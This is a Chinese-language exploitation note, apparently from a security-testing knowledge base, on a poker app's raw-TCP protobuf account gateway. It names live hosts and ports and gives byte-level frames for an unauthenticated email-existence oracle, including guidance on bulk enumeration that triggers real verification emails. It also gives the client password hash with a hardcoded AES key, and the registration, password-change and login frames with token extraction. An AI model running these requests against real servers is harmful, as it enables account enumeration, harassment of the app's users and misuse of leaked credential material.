## 描述

裸 TCP protobuf 网关账号生命周期帧的权威帧形与实测语义；含未认证邮箱存在性判定原语。帧格式：16B 头(rsv u32=0/type u32/len i32/seq i32)+protobuf。预登录即可用 0x2000 useType=2 判定任意邮箱是否已注册，无 token/会话/captcha。

```
环境：本机直连（requests trust_env=False / --noproxy '*'），固定出口 IP，帧间 ≥6s，每发前先发 0x1000 HEARTBEAT 并回显自校验。

【用途一 · low，未认证邮箱账号存在性 oracle（可批量，注意骚扰风险）】
1) 连 host:port（sjan.o0hyfmi.club:36610；同族记录另有 uips.pmcqef.com:12984，未在本条内单独复测）；
2) 0x2000 body = {1:0, 2:<email>, 3:"vip_1", 4:2, 6:""}，即 fv(1,0)+fs(2,email)+fs(3,"vip_1")+fv(4,2)+fs(6,"")；
3) 判读（双重差分）：
   未注册 → 响应 field1=4，耗时 ≈0.06s，不发邮件；
   已注册 → field1 省略（proto3 默认 =0），耗时 ≈5.5s，且真实下发 6 位验证码邮件。
   两个信号必须同时一致才判；proto3 省略默认值，别把"没有 field1"当成解析失败。
4) 速率：已注册样本会真发信，批量枚举等于对真实用户发骚扰邮件，按授权范围从严控制（建议 ≥6s/发，先小样本）。

【用途二 · 正常注册/改密链，供自建账号复用】
0x2000 useType=1 取注册码 → 0x200C{1:deviceType=2,2:type=0,3:account,4:verifyCode,5:"vip_1",6:"GLHYST4SRU",7:GetPWD(明文),9:sAttach} 注册，响应 uid 在 field6、state 在 field7；

GetPWD=MD5(base64(AES-ECB(SHA256(明文+reverse(MD5(明文))).upper())))[:20]，AES KEY=1122334455667788990099887766smzy。

【已证否，别重复走】
错码/空码/已用码重放/跨账号码一律 Result≠0（2/1/2/2），不存在验证码逻辑绕过；0x2017 在已登录 socket 上仍被受理（非按消息类型 EOF）。account 字段的 SQL/命令注入载荷均与基线同回显（见负面条目 529）。

【常见失败原因】
· email 未过格式前置校验 → Result=1（本次引号/无元字符非法邮箱均回 1，0.074s）；
· 走平台代理对裸 TCP 目标易断链 → 必须直连；
· 未做 HEARTBEAT 校验时把半开连接的空响应当 Result=0。
```

```
## 帧格式
16 字节头：struct.pack("<I",0) + struct.pack("<I",type) + struct.pack("<i",len(body)) + struct.pack("<i",seq) + body
protobuf: 字段号按 wire type 0(varint)/2(len-delim) 编码。

## 账号存在性 oracle（low，未认证）
REQ 0x2000: fv(1,0) + fs(2,email) + fs(3,"vip_1") + fv(4,2) + fs(6,"")
未注册: resp pb=[[1,0,4],[3,2,email],[4,2,"vip_1"],[5,0,2]]  (~0.06s)
已注册: resp pb=[[3,2,email],[4,2,"vip_1"],[5,0,2]]        (~5.5s, 触发验证码邮件)
判据双重差分：Result 0/4 + 耗时 5.5s/0.06s。
（2026-11-05 四样本：未注册 C/D = Result 4 / 0.060~0.062s / 90s 无邮件；已注册 A uid=526051、B uid=631978 = Result 0 / 5.514~5.874s / 真收码）

## 注册（自建账号）

0x200C: fv(1,2)+fv(2,0)+fs(3,email)+fs(4,code)+fs(5,"vip_1")+fs(6,"GLHYST4SRU")+fs(7,GetPWD(pwd))+fs(9,email)
响应 uid 在 field6，state 在 field7（=-1），Result 成功时 field1 省略。

## 改密（正常功能，未发现绕过）

0x2017: fv(1,0)+fs(2,email)+fs(3,"vip_1")+fs(4,code)+fv(5,1)+fs(6,GetPWD(newpwd))
  真码 -> Result=0；错码 000000 -> 2；空码 -> 1；已用码重放 -> 2；跨账号码 -> 2
0x2001 登录: fv(1,2)+fv(2,10)+fs(3,GetPWD(pwd))+fs(4,"vip_1")+fs(5,email)+fs(8,email)+fs(9,kv(0,"1.0.0.9"))+fs(9,kv(1,deviceid))+fs(9,kv(4,"com.pksj.poker"))+fs(10,through)
  kv(k,v)=fv(1,k)+fs(3,v)；成功返回 field2=uid, field3=state, field9 内 key=-99 的 value 为 token。
```
